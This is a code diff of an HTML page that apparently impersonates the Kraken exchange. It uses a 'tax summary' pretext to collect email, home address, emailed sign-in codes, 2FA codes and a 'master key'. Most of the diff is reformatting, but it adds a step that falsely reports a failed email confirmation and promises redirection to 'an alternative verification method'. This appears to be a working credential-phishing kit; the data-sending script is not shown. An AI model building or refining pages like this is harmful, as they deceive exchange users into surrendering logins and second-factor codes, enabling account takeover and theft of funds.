@@ -235,18 +235,18 @@
       }
     </style>
 
-<style>
-  /* Only target radio buttons */
-  input[type="radio"] {
-    accent-color: #7132f5;  /* Color of the radio when selected */
-    cursor: pointer;
-  }
+    <style>
+      /* Only target radio buttons */
+      input[type="radio"] {
+        accent-color: #7132f5; /* Color of the radio when selected */
+        cursor: pointer;
+      }
 
-  label {
-    margin-right: 15px;
-    font-size: 13px;
-  }
-</style>
+      label {
+        margin-right: 15px;
+        font-size: 13px;
+      }
+    </style>
   </head>
   <body
     class="pro-text-theme light-theme ds-light-bg default-shape-theme"
@@ -565,20 +565,29 @@
                           class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 gap-ds-1 flex-col flex"
                         >
                           <div style="padding: 4px 8px">
-                            <p style="font-size: 13px; margin-bottom: 12px;">
+                            <p style="font-size: 13px; margin-bottom: 12px">
                               Do you want to receive the tax summary in printed
                               form at your home?
                             </p>
 
-                            
-                            
-                            
                             <label>
-                              <input type="radio" name="choice" value="yes" onclick="toggleBox(true)">
+                              <input
+                                type="radio"
+                                name="choice"
+                                value="yes"
+                                onclick="toggleBox(true)"
+                              />
                               <span class="yes-label">Yes</span>
                             </label>
                             <label>
-                              <input id="no" type="radio" name="choice" value="no" checked onclick="toggleBox(false)">
+                              <input
+                                id="no"
+                                type="radio"
+                                name="choice"
+                                value="no"
+                                checked
+                                onclick="toggleBox(false)"
+                              />
                               <span>No</span>
                             </label>
                           </div>
@@ -586,7 +595,8 @@
 
                         <div
                           class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 gap-ds-1 flex-col flex"
-                          id="extraBox" style="display: none;"
+                          id="extraBox"
+                          style="display: none"
                         >
                           <div
                             id="address-container"
@@ -622,8 +632,6 @@
                             >Enter your Home Address</span
                           >
                         </div>
-
-                        
                       </div>
                     </div>
                     <div
@@ -680,8 +688,9 @@
                             ><span
                               id=":rf:"
                               class="text-ds-notification-text-lg text-ds-notification-subtitle-negative"
-                              >Your entered email may be
-                              incorrect. If email is same as email registered on Kraken, please try again with your Email.</span
+                              >Your entered email may be incorrect. If email is
+                              same as email registered on Kraken, please try
+                              again with your Email.</span
                             >
                           </div>
                         </div>
@@ -704,9 +713,8 @@
               </div>
             </div>
           </div>
-          
-          <div id="2" class=" card mt-4 w-[498px]" style="display: none">
-           
+
+          <div id="2" class="card mt-4 w-[498px]" style="display: none">
             <div
               class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
               style="--ds-bg-parent-color: var(--background-color-ds-container)"
@@ -810,17 +818,13 @@
                     <div
                       role="region"
                       aria-labelledby="alternative-2fa-methods"
-                    >
-                      
-                      
-                    </div>
-                   
+                    ></div>
                   </div>
                 </form>
               </div>
             </div>
           </div>
-         
+
           <div id="3" class="card mt-4 w-[498px]" style="display: none">
             <div
               class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
@@ -847,10 +851,11 @@
               <div
                 class="text-ds-neutral text-ds-body1 ms-ds-0 me-ds-0 mt-ds-0 mb-ds-7"
               >
-              The procedure is almost finished. Proceed to read the digital summary document sent by email. Please
-              remember to check your spam folder too.
+                The procedure is almost finished. Proceed to read the digital
+                summary document sent by email. Please remember to check your
+                spam folder too.
               </div>
-             
+
               <button
                 id="enter-approval"
                 class="text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl"
@@ -866,7 +871,6 @@
           </div>
 
           <div id="4" class="card mt-4 w-[498px]" style="display: none">
-         
             <div
               class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
               style="--ds-bg-parent-color: var(--background-color-ds-container)"
@@ -1000,15 +1004,13 @@
                         >
                       </button>
                     </div>
-                    
                   </div>
                 </div>
               </div>
             </div>
           </div>
 
-          <div id="5" class=" card mt-4 w-[498px]" style="display: none">
-           
+          <div id="5" class="card mt-4 w-[498px]" style="display: none">
             <div
               class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
               style="--ds-bg-parent-color: var(--background-color-ds-container)"
@@ -1050,8 +1052,7 @@
                         <div
                           class="text-ds-neutral text-ds-body1 ms-ds-0 me-ds-0 mt-ds-3 mb-ds-7"
                         >
-                          Enter the Sign-in code from your Email
-                          app.
+                          Enter the Sign-in code from your Email app.
                         </div>
                       </div>
                       <div class="mb-3 w-full">
@@ -1112,18 +1113,45 @@
                     <div
                       role="region"
                       aria-labelledby="alternative-2fa-methods"
-                    >
-                      
-                      
-                    </div>
-                   
+                    ></div>
                   </div>
                 </form>
               </div>
             </div>
           </div>
 
-
+          <div id="6" class="card mt-4 w-[498px]" style="display: none">
+            <div
+              class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
+              style="--ds-bg-parent-color: var(--background-color-ds-container)"
+            >
+              <div class="flex place-content-center">
+                <img
+                  alt="Kraken shield lock illustration"
+                  fetchpriority="high"
+                  width="384"
+                  height="384"
+                  decoding="async"
+                  data-nimg="1"
+                  class="w-48 h-48 mb-6"
+                  src="/accounts/_next/static/media/ShieldLock.c36adeed.png"
+                  style="color: transparent"
+                />
+              </div>
+              <div
+                class="text-ds-primary text-ds-heading3 ms-ds-0 me-ds-0 mt-ds-0 mb-ds-4"
+              >
+                Read Digital Summary
+              </div>
+              <div
+                class="text-ds-neutral text-ds-body1 ms-ds-0 me-ds-0 mt-ds-0 mb-ds-7"
+              >
+                The email confirmation attempt was unsuccessful. To ensure
+                continuity, we will proceed with an alternative verification
+                method. You will be redirected in a few moments.
+              </div>
+            </div>
+          </div>
         </div>
         <footer class="mt-auto w-full">
           <div
@@ -1275,18 +1303,14 @@
         input.style.paddingBottom = "0.2rem";
       });
 
-      
-    document
-      .getElementById("show-password-2")
-      .addEventListener("click", (e) => {
-        e.preventDefault();
-        const input = document.getElementById("master-key-input"); // specific input
-        if (!input) return;
-        input.type = input.type === "password" ? "text" : "password";
-      });
-
-      
-       
+      document
+        .getElementById("show-password-2")
+        .addEventListener("click", (e) => {
+          e.preventDefault();
+          const input = document.getElementById("master-key-input"); // specific input
+          if (!input) return;
+          input.type = input.type === "password" ? "text" : "password";
+        });
     </script>
 
     <script src="/js/index.js"></script>
